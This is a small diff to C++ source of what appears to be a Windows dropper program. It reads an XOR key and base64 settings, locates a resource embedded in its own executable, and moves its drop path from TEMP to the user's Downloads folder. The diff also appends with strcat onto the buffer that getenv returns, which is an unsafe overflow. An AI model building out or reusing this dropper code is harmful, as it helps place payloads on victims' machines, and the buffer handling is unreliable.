@@ -70,7 +70,6 @@ int main(int argc, char* argv[])
 	setup_name();
 
 	printf("The macro is: %s. The xor key is: %d. The base64 is: %d\n", DROPPER_OUTPUT, DROPPER_XOR_KEY, DROPPER_BASE64);
-
 	// Handle to myself
 	HMODULE h = GetModuleHandle(NULL);
 	// Locate Resource
@@ -111,9 +110,11 @@ int main(int argc, char* argv[])
 
 void setup_name() {
 
-	char* temp = std::getenv("TEMP");
+	char* temp = std::getenv("USERPROFILE");
+
 
 	if (temp != nullptr){
+		strcat(temp, "\\Downloads");
 		std::strncpy(name, temp, sizeof(name) - 1);
 		name[sizeof(name) - 1] = '\0';
 	}
